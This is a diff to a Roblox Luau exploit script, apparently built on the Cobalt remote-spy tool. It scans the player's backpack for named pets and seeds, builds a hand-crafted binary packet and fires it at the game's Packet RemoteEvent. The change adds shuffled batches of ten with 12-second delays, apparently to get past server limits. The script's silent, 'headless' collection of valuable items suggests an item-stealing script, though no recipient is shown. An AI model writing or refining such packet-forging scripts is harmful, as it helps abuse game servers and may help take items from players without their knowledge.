@@ -1,11 +1,11 @@
 -- Headless Cobalt Scanner & Auto-Fire Payload
--- (Customised by admin)
+-- (Batch sending: all seeds + 10 pets, then 10 pets each batch, 12s delay)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local ALL_PETS = {"Unicorn", "Bald Eagle", "Monkey", "Owl", "Frog", "Golden Dragonfly", "Bunny", "Bee", "Turtle", "Black Dragon", "Ice Serpent", "Bear", "Butterfly", "Firefly", "Raccoon", "Deer", "Robin"}
-local ALL_SEEDS = {"Hypno Bloom", "Green Bean", "Grape", "Coconut", "Mushroom", "Acorn", "Tomato", "Dragon's Breath", "Star Fruit", "Moon Bloom", "Briar Rose", "Venom Spitter", "Apple", "Venus Fly Trap", "Rocket Pop", "Bamboo", "Fire Fern", "Corn", "Pomegranate", "Sunflower", "Dragon Fruit", "Cherry", "Sun Bloom", "Blueberry", "Carrot", "Mango", "Cactus", "Strawberry", "Banana", "Poison Apple", "Tulip", "Pineapple"}
+local ALL_PETS = {"Unicorn", "Bald Eagle", "Monkey", "Owl", "Frog", "Golden Dragonfly", "Bunny", "Butterfly", "Bear", "Raccoon", "Bee", "Black Dragon", "Turtle", "Firefly", "Deer", "Ice Serpent", "Robin"}
+local ALL_SEEDS = {"Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple", "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean", "Banana", "Grape", "Coconut", "Mango", "Rocket Pop", "Dragon Fruit", "Acorn", "Cherry", "Sunflower", "Fire Fern", "Venus Fly Trap", "Pomegranate", "Poison Apple", "Venom Spitter", "Briar Rose", "Moon Bloom", "Hypno Bloom", "Dragon's Breath", "Sun Bloom", "Star Fruit"}
 local petSet = {}
 for _, name in ipairs(ALL_PETS) do petSet[name:lower()] = true end
 local seedSet = {}
@@ -14,31 +14,41 @@ for _, name in ipairs(ALL_SEEDS) do seedSet[name:lower()] = true end
 local backpack = player:WaitForChild("Backpack", 5)
 if not backpack then warn("Cobalt: Backpack not found."); return end
 
-local scannedItems = {}
+-- Separate seeds and pets
+local seedItems = {}
+local petItems = {}
+
 for _, item in ipairs(backpack:GetChildren()) do
     local mainCategory = item:GetAttribute("MainCategory")
     if mainCategory == "Seed" then
         local seedTool = item:GetAttribute("SeedTool")
         if seedTool and seedSet[seedTool:lower()] then
             local count = item:GetAttribute("Count") or 1
-            table.insert(scannedItems, {itemKey = seedTool, count = count, category = "Seeds"})
+            table.insert(seedItems, {itemKey = seedTool, count = count, category = "Seeds"})
         end
     else
         local petName = item:GetAttribute("Pet")
         local petId = item:GetAttribute("PetId")
         if petName and petSet[petName:lower()] then
-            table.insert(scannedItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
+            table.insert(petItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
         end
     end
 end
 
-if #scannedItems == 0 then
-    warn("Cobalt: No matching items found.")
-    return
+-- Shuffle pets randomly
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
 end
+shuffle(petItems)
 
-print(string.format("Cobalt: Found %d matching items! Firing payload...", #scannedItems))
+local totalSeeds = #seedItems
+local totalPets = #petItems
+print(string.format("Cobalt: Found %d seeds and %d pets. Starting batches...", totalSeeds, totalPets))
 
+-- ========== SERIALIZATION FUNCTIONS ==========
 local function smartEscape(str)
     local escaped = ""
     for i = 1, #str do
@@ -73,27 +83,34 @@ local function encodeNumber(num)
     return "\\x05" .. numByte
 end
 
-local finalBufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
-
-for index, item in ipairs(scannedItems) do
-    local indexByte = string.format("\\x%02X", index)
-    if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
-    finalBufferString = finalBufferString .. indexByte .. "\\x1C"
-    finalBufferString = finalBufferString .. encodeString("ItemKey") .. encodeString(item.itemKey)
-    finalBufferString = finalBufferString .. encodeString("Count") .. encodeNumber(item.count)
-    finalBufferString = finalBufferString .. encodeString("Category") .. encodeString(item.category)
-    finalBufferString = finalBufferString .. "\\x00"
-    if index < #scannedItems then finalBufferString = finalBufferString .. "\\x05" end
+local function buildPayloadString(itemList)
+    if #itemList == 0 then return nil end
+    local bufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
+    for index, item in ipairs(itemList) do
+        local indexByte = string.format("\\x%02X", index)
+        if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
+        bufferString = bufferString .. indexByte .. "\\x1C"
+        bufferString = bufferString .. encodeString("ItemKey") .. encodeString(item.itemKey)
+        bufferString = bufferString .. encodeString("Count") .. encodeNumber(item.count)
+        bufferString = bufferString .. encodeString("Category") .. encodeString(item.category)
+        bufferString = bufferString .. "\\x00"
+        if index < #itemList then bufferString = bufferString .. "\\x05" end
+    end
+    bufferString = bufferString .. "\\x00\\x00"
+    return bufferString
 end
-finalBufferString = finalBufferString .. "\\x00\\x00"
 
-local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules")
-    and ReplicatedStorage.SharedModules:FindFirstChild("Packet")
-    and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
-
-if packetEvent then
+local function firePayloadString(payloadStr)
+    if not payloadStr then return false end
+    local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules")
+        and ReplicatedStorage.SharedModules:FindFirstChild("Packet")
+        and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
+    if not packetEvent then
+        warn("Cobalt: RemoteEvent not found.")
+        return false
+    end
     local success, err = pcall(function()
-        local binaryStr = finalBufferString
+        local binaryStr = payloadStr
             :gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end)
             :gsub("\\v", "\v"):gsub("\\a", "\a")
             :gsub("\\t", "\t"):gsub("\\n", "\n"):gsub("\\r", "\r")
@@ -102,10 +119,54 @@ if packetEvent then
         packetEvent:FireServer(payloadBuffer)
     end)
     if success then
-        print("Cobalt: Payload fired!")
+        print("Cobalt: Batch fired.")
+        return true
     else
         warn("Cobalt: Fire failed: " .. tostring(err))
+        return false
     end
-else
-    warn("Cobalt: RemoteEvent not found.")
 end
+
+-- ========== BUILD BATCHES ==========
+local petIndex = 1
+local batchNumber = 1
+
+-- First batch: ALL seeds + first 10 pets (or all if <10)
+local firstBatchItems = {}
+for _, seed in ipairs(seedItems) do table.insert(firstBatchItems, seed) end
+local petsInFirst = math.min(10, totalPets)
+for i = 1, petsInFirst do
+    table.insert(firstBatchItems, petItems[petIndex])
+    petIndex = petIndex + 1
+end
+
+if #firstBatchItems > 0 then
+    print(string.format("Cobalt: Sending batch %d (%d items: %d seeds, %d pets)", batchNumber, #firstBatchItems, #seedItems, petsInFirst))
+    local payload = buildPayloadString(firstBatchItems)
+    firePayloadString(payload)
+    batchNumber = batchNumber + 1
+    if petIndex <= totalPets then
+        print("Cobalt: Waiting 12 seconds before next batch...")
+        task.wait(12)
+    end
+end
+
+-- Subsequent batches: chunks of 10 pets
+while petIndex <= totalPets do
+    local chunkItems = {}
+    local chunkSize = math.min(10, totalPets - petIndex + 1)
+    for i = 1, chunkSize do
+        table.insert(chunkItems, petItems[petIndex])
+        petIndex = petIndex + 1
+    end
+    print(string.format("Cobalt: Sending batch %d (%d pets)", batchNumber, chunkSize))
+    local payload = buildPayloadString(chunkItems)
+    firePayloadString(payload)
+    batchNumber = batchNumber + 1
+    if petIndex <= totalPets then
+        print("Cobalt: Waiting 12 seconds before next batch...")
+        task.wait(12)
+    end
+end
+
+print("Cobalt: All batches completed!")
